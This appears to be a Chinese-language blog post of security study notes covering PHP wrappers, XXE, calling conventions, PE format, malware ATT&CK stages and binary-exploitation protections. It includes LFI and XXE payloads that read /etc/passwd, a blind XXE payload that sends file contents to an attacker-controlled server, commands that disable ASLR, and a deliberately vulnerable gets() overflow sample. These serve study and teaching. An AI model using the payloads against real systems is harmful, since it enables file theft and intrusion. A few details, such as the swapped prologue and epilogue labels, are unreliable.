---
layout: post
title: "Security Related"
date: 2026-02-25
category: "Knowledge｜Terminology"
tags: []
draft: false
toc: true
comments: true
---

# Security Related
<!-- more -->

## 名詞解釋

| Vocabulary    | Def.| Comment|
| - | - | - |
| parse| 解析||
| query| 詢問、請求||
| dump| Also called a crash dump or memory dump, a dump is raw data from a computer's memory. It is written to the file system if software crashes" (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it. | [Refer](https://www.computerhope.com/jargon/d/dump.htm)|
| intruder| 入侵者||
| vulnerability | 漏洞、脆弱||
| exploit| An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network.| [Refer](https://www.trendmicro.com/vinfo/us/security/definition/exploit)|
| wrapper| 偽協議||
| cipher| 密碼||
| nerf| cause to be weak or ineffective削弱、減弱| [Refer](https://english.cool/op-nerf-buff/)|
| miscellaneous | 混雜的、各種各樣的||
| PoC| Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞||
| PWN| 1.具漏洞的服務<br>2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權| [Refer1](https://csc.nccst.nat.gov.tw/shield.aspx/)<br>[Refer2](https://ithelp.ithome.com.tw/articles/10295763) |
|DHCP|主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收||
|[Encrypt VS Hash](https://ithelp.ithome.com.tw/articles/10193762)|||
|[CRLF VS LF](http://violin-tao.blogspot.com/2016/04/crlflf-bug.html)|||
|[magic method](https://www.analyticsvidhya.com/blog/2021/07/explore-the-magic-methods-in-python/)|||

## 資安 基本教學
* [惡意程式(malware)](https://ithelp.ithome.com.tw/articles/10282551)
* [不安全的連線？HTTPS與SSL憑證](https://ithelp.ithome.com.tw/articles/10240752)
* [Day 018.聽起來好像很厲害的-密碼學](https://ithelp.ithome.com.tw/articles/10248442)
* [Day21-針對Metasploitable 3進行滲透測試(2)-Shell & Reverse Shell基礎知識](https://ithelp.ithome.com.tw/articles/10278494)
* [[2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？](https://ithelp.ithome.com.tw/articles/10193762)
* [[2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼](https://ithelp.ithome.com.tw/articles/10193241)
* [Day 21.加密演算法要注意的那些毛(一)-加密模式](https://ithelp.ithome.com.tw/articles/10249953)
* [『Day 27』拜託別Pwn我啦！-常見的工具（下）](https://ithelp.ithome.com.tw/articles/10227380)
* [payload VS formData](https://kknews.cc/zh-tw/code/ogmnm55.html)
* [APT](https://blog.trendmicro.com.tw/?p=123)

## Web 教學
### SQL
* [Day 4 很像走迷宮的sqlmap](https://ithelp.ithome.com.tw/articles/10202811)
* [[Day20]-新手的Web系列SQLmap](https://ithelp.ithome.com.tw/articles/10249489)

### SSTI
* [[Day11]SSTI(Server Side Template Injection)](https://ithelp.ithome.com.tw/articles/10272749)
* [[Day13]-SSTI(Server-side template injection)](https://ithelp.ithome.com.tw/articles/10244403)

### PHP
* [Day 12 - PHP 偽協議 (一) ](https://ithelp.ithome.com.tw/articles/10245020)
* [[Day7]-PHP(LFI/RFI)](https://ithelp.ithome.com.tw/articles/10240486)

#### 偽協議
PHP 偽協議（PHP wrappers / stream wrappers）是指 PHP 內建的一種特殊 URI 協議機制，讓你可以用類似 URL 的方式去讀寫「不同來源」的資料，而不只是單純的檔案。為什麼叫「偽協議」？因為它看起來像：
```
http://
ftp://
```
但其實是：

* PHP 內部 stream wrapper
* 不是網路 protocol
* 只是 PHP 處理資料的一種方式

1. `php://filter`: 👉 CTF 最常出現（LFI 利用）
    範例：
    ```php
    include("php://filter/convert.base64-encode/resource=index.php");
    ```
    作用：

    * 對檔案做轉換
    * 可以 base64 encode 原始碼
    * 常用來繞過 LFI 讀 source code

    典型攻擊如下然後再自己 base64 decode。：
    ```php
    ?page=php://filter/convert.base64-encode/resource=config.php
    ```
2. `php://input`: 用來讀 HTTP request body。
    ```php
    file_get_contents("php://input");
    ```
    常見用途：
    * API 接 JSON
    * CTF 裡配合 `include()` 造成 RCE
3. `php://stdout` / `php://stderr`: CLI 環境用。
4. `php://memory` / `php://temp`: 建立記憶體中的暫存檔案。
5. `file://`: 其實是一般檔案讀取。
    ```html
    file:///etc/passwd
    ```
6. `phar://`: `phar`本身是一個php特殊的**壓縮文件**，打包多個php資源到一個 `*.phar`，而`phar://`就是用來讀取phar內容的wrapper，所以利用`phar://`讀取phar file時，會直接對其metadata反序列化
    * **PHP8.0以前**，這是高階但現在堪用的技巧，因為PHH8.0之後這個features就被改掉了。可以透過反序列化觸發 object injection。凡是只要能夠1)檔案可控 2)用讀檔的任意function讀取，就有機會觸發
    * 常見的讀檔function
        ```
        unlink
        include
        file_get_contents
        getimagesize
        file_exists("phar://evil.phar/test.txt");
        ```

### XXE
#### 名詞解釋
* Document Type Definition(DTD):　用來定義 XML 文件的結構規則
    * 沒有DTD的xml
        ```xml
        <creds>
        <user>admin</user>
        </creds>
        ```
    * 有DTD的xml
        ```xml
        <!DOCTYPE creds [
        <!ELEMENT creds (user)>
        <!ELEMENT user (#PCDATA)>
        ]>
        <creds>
        <user>admin</user>
        </creds>
        ```
        這段 DTD 在說：creds 裡面必須有 user，並且user 只能是文字
* DOCTYPE: 用來「宣告」這份 XML 使用哪個 DTD
    * Inline: DTD 直接寫在 XML 裡。
        ```xml
        <!DOCTYPE creds [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        ```
    * External: 從外部引入DTD
        ```xml
        <!DOCTYPE creds SYSTEM "http://example.com/test.dtd">
        ```
        代表去下載 test.dtd ，再用裡面的規則
* ENTITY: XML 裡面可以被「替換成其他內容」的變數，就像 XML 的「巨集（macro）」或「替換符號」。
    * 內建的 ENTITY

        | Entity  | 代表  |
        | ------- | --- |
        | `&lt;`  | `<` |
        | `&gt;`  | `>` |
        | `&amp;` | `&` |
    * 自定義 ENTITY
        ```xml
        <!DOCTYPE creds [
        <!ENTITY name "test">
        ]>
        <creds>
        <user>&name;</user>
        </creds>
        ```
        解析後
        ```xml
        <user>test</user>
        ```
    * 外部 ENTITY (External Entity): 會讀檔案或 URL。
        ```xml
        <!DOCTYPE creds [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <creds>
        <user>&xxe;</user>
        </creds>
        ```
        當看到 `&xxe;` 就去讀 `/etc/passwd `再把內容塞進來

#### 實際攻擊
XXE 不是 XML 漏洞。而是 XML parser 被允許解析 external entity，如果讀的檔案是個機敏資料，並且有機會顯示出來，那就會是漏洞

#### Blind XXE
有 XXE 漏洞但伺服器「沒有把讀到的資料回顯給你」
* Payload
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE roottag [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///path/to/file">
    <!ENTITY % dtd SYSTEM "http://0.0.0.0:5000/evil.xml">
    %dtd:
    ]>

    <roottag>&send;</roottag>
    ```
* evil.xml
    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://0.0.0.0:5000/?%file;'>">
    %all;
    ```
這是一個<span style="background-color: yellow">標準 Blind XXE + 外部 DTD + OOB 外帶資料</span>的完整攻擊範例

1. 送惡意 XML: 也就是主要payload，
2. 伺服器讀取本地檔案: `%file` 利用php filter wrapper讀取 /path/to/file
3. Base64 編碼
4. 載入外部 DTD（evil.xml）: 因為執行到主要payload的`%dtd`變數
5. evil.xml 建立新的 entity: 定義 `%all`並且`%file`會先展開
6. 伺服器對攻擊者發 HTTP request
7. 攻擊者收到檔案內容: 攻擊者的server log會看到`%file` → base64-encode(file:///path/to/file)

#### 為什麼要分成兩段？
因為：在 XML 規範中
> 不能在內部 DTD 直接把 %file 放進 SYSTEM URL，很多 parser 會擋

也就是不能
```xml
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY send SYSTEM "http://attacker.com/?x=%file;">
]>

不會變成 → http://attacker.com/?x=(/etc/passwd內容)
```
我們的目的是要達到**字串拼接**並且把內容傳送出來，所以要：
1. 在主 DTD 定義 %file
2. 載入外部 DTD
3. 在外部 DTD 裡組合 URL

這樣才能成功。

### 其他
* [LFI VS RFI](https://ithelp.ithome.com.tw/articles/10240486): LFI(Local File Inclusion)<br>產生的原因是程式設計師未檢查用戶輸入的參數，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏<br><br>RFI(Remote File Include)<br>基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數 `allow_url_include` 設定為 `ON`
* [[Day23]forensics的開始](https://ithelp.ithome.com.tw/articles/10208651)

## Reverse
* [[Day10]格式透視-解析PE文件格式（前篇）](https://ithelp.ithome.com.tw/articles/10187490)
* [[Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術](https://ithelp.ithome.com.tw/articles/10188209)


|Section| Perm|Description|
|---|---|---|
|.text|R-X|Executable Code (Instructions)|
|.data |RW-| Global with initial data|
|.rodata| R— ReadOnly Data|
|.bss |RW- |Global without initial data|

* Source code → ELF
    <img src="/assets/posts/Terminology/Security Related - Source to ELF.png" width=300>
* ELF → Process
    <img src="/assets/posts/Terminology/Security Related - ELF to Process.png" width=300>

### Calling Convention
#### x86
* Linux:
    
    x86 呼叫慣例⼤部分會將 Parameters 往 Stack 上⾯堆，回傳值放到 edx:eax (超過 32bit 的話): stdcall, fastcall, thiscall, cdcel, …
    * fastcall
        * 前兩個參數分別放於 ecx, edx
        * 其他都堆到 Stack 上
    * stdcall
        * 在 Win32 上⾯⽤的
        * 參數全都堆到 Stack 上⾯
        * 由 Callee 做 Stack Cleanup
* Windows: stdcall, fastcall, thiscall, cdcel, …
    * [MSDN — Argument Passing and Naming Conventions](https://learn.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170)

#### x64
* Linux: x64 則是依賴 Register 傳參
    * Syscall Number: RAX
    * Parameters: RDI, RSI, RDX, r10, r8, r9, Stack
    * Return Value: RAX
* Windows:
    * 前四個依序放入 rcx, rdx, r8, r9
    * 其餘放上 stack
    * [MSDN — x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170)

#### C ABI
* Return Value: RDX:RAX
* Parameters: RDI, RSI, RDX, RCX, r8, r9, Stack

#### Function Epilogue / Function Prologue
Stack Register
* SP(Stack Pointer Register)
    * 指向 Stack Frame 的頂端
* BP(Stack Base Pointer Register)
    * 指向 Stack Frame 的底部
```
// Function Epilogue
endbr64
push rbp
mov rbp, rsp
sub rsp, 30h
mov rax, fs:28h

// Function Prologue
leave // = mov $rsp, $rbp; pop $rbp;`
retn // = pop $rip
```

### Windows API v.s. Linux Glibc

|Operating System | Windows | Linux|
|---|---|---|
|OS API| Windows API| GNU C Library|
|Library | System DLLs (e.g. kernel32.dll) | libc.so.6|
|Library Format | .dll (PE) | .so (ELF)|
|Documentation |MSDN| man page|

### Naming Convention
* API 命名：Upper Camel Case
    * Suffix
        * A：字串參數為 ANSI char
        * W：字串參數為 Wide char
        * Ex：提供更多控制參數 (EXtend)
    * Prefix
        * Nt：Native APIs

## Malware Reverse
1. 初始存取 & 執行: 利用釣魚郵件
2. Defense Evasion: 惡意程式用來「躲避偵測、分析、或防毒軟體」的技術
    1. [將惡意程式設為隱藏檔案](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileattributesa)
    2. 執行後刪除惡意程式
    3. 關閉、打下防毒軟體
    4. 清除 Windows Event Log
    
    * [Att&CK - T1480 (Execution Guardrails)](https://attack.mitre.org/techniques/T1480/): 只在環境符合特定條件時執行，針對特定對象進行攻擊，常見條件：漏洞、系統語言、時間、Hostname...
        ```
        SystemTimeToFileTime
        CreateWaitableTimerW
        SetWaitableTimer
        WaitForSingleObject
        ```
    * [Att&CK - T1497 (Virtualization/Sandbox Evasion)](https://attack.mitre.org/techniques/T1497/): 偵測若處於 VM 或是自動化分析環境之中，則改變 / 隱藏惡意行為，常見偵測項目：網卡、memory 大小、分析工具、延遲執行
    * [Att&CK - T1027.009 (Obfuscated Files or Information: Embedded Payload)](https://attack.mitre.org/techniques/T1027/009/): 真正的malware file會embedded在啟動的檔案中，避免一落地被偵測到，所以落地後需要經過一系列的extract或解密
3. 持續潛伏 Persistence
    5. 註冊 scheduled task，定期執行惡意程式
    6. 建立後門帳號

    * [Att&CK - T1547 (Boot or Logon Autostart Execution)](https://attack.mitre.org/techniques/T1547/): 當malware落地後並且被執行，就要把自己複製到startup folder，並且設定自己的權限
        ```
        GetModuleFileNameA
        GetUserNameA
        CopyFileA
        SetFileAttributesA
        ```
    * [Att&CK - T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder)](https://attack.mitre.org/techniques/T1547/001/)
    * [Att&CK - T1543.003 (Create or Modify System Process: Windows Service)](https://attack.mitre.org/techniques/T1543/003/)
    * [Att&CK - T1053.005 (Scheduled Task/Job: Scheduled Task)](https://attack.mitre.org/techniques/T1053/005/)
    
4. 權限提升 Privilege Escalation
    7. 利用漏洞將使用者提權至 Administrator
5. 憑證存取 Credential Access
    8. 從作業系統取得明文密碼、NTLM hash
6. 探索 Discovery
    9. 掃描系統上的帳號，內網中的網路服務、芳鄰、其他機器
7. 橫向移動 Lateral Movement
    10. 透過 RDP、WinRM ，利用已取得的 credential 或本身權限移動至其他機器
8. 蒐集 Collection
    11. 蒐集文件、瀏覽器、Email、剪貼簿等資料
9. 指揮與控制 Command & Control (C2)
    12. 與攻擊者的 C2 server 連線，取得後續指令
10. 滲出 Exfiltration
    13. 將資料透過連線傳回攻擊者的 C2 server

### PE File Format
* VA(Virtual Address) = ImageBase(映射到process memory的起始位址) + RVA(Relative Virtual Address，位移): ImageBase：PE 映射至 process memory 中的位址
    <img src="/assets/posts/Terminology/Security Related - RVA VA.png" width=300>
* Windows 版本的ELF
    <img src="/assets/posts/Terminology/Security Related - PE Format.png" width=300>
    * DOS Header, Stub：向下相容 DOS，大多數欄位無用
        * 0x00: "MZ" (0x5A4D) 字串，Magic number，用於標示 PE 的起始點
        * 0x3C: e_lfanew，NT Headers 的 file offset
    * NT Headers = File Header + Optional Header：紀錄檔案及 loader 載入時所需的 metadata
        * 執行所需的系統架構
        * 編譯時間
        * ImageBase
        * 程式進入點 (Address of Entrypoint)
        * enable / disable ASLR
        * Import, Export, Relocation Table
    * Section Headers：紀錄各 section 的 metadata
    * Section Data：各 section 資料
    * .text, .data, .idata, …

## PWN
* [『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） ](https://ithelp.ithome.com.tw/articles/10227326)
* [『Day 27』拜託別Pwn我啦！-常見的工具（下）](https://ithelp.ithome.com.tw/articles/10227380)
* [Day25: [Misc] 我從來沒想過我會害怕寫 code](https://ithelp.ithome.com.tw/articles/10226977)

### ELF Section
* Plt
* Text
* Rodata
* Data
* Bss
* Got
* Init fini

### Stack Frame
<img src="/assets/posts/Terminology/Security Related - PWN Stack Frame.png" width=300>

### `checksec`保護
* No RELRO or Partial RELRO → <span style="background-color: yellow">GOT Hijacking(改寫GOT)</span>
    * No RELRO - link map和GOT都可寫(有lazy binding)
    * Partial RELRO - link map不可寫，GOT可寫(有lazy binding)
    * Full RELRO - link map和GOT都不可寫(事先把library的位置都先resolve完並寫在GOT上，再把GOT權限關掉，比較花時間但安全)
    * 關閉指令：`-z norelro`
* Position Independent Executable(PIE) → <span style="background-color: yellow">BOF(ret2 series)</span>，開啟時，data 段以及 code 段位址隨機化
    * 關閉指令：`-no-pie`
* NX (No eXecute, Data Execution Prevention, DEP) off → 基本上不能直接執行shellcode，但可以用<span style="background-color: yellow">ROP</span>繞過 → 可寫得不可執⾏，可執⾏的不可寫
    * 關閉指令：`-zexecstack`
* ASLR (Address Space Layout Randomization): 記憶體位址隨機變化，每次執⾏時，<span style="background-color: yellow">stack、heap、library</span> 位置都不⼀樣
    * 關閉指令: `sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"`
    * 打開指令: `sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space"`
* Stack Canary
    * 關閉指令：`-fno-stack-protector`

### Stack Vulnerability
#### BOF
沒有檢查輸入長度，當輸入的惡意payload蓋到stack上的return address，就有可能RCE
```c
#include <stdio.h>
    void hacked() {
    system("/bin/sh");
}
int main() {
    char str[8];
    gets(str);
}
```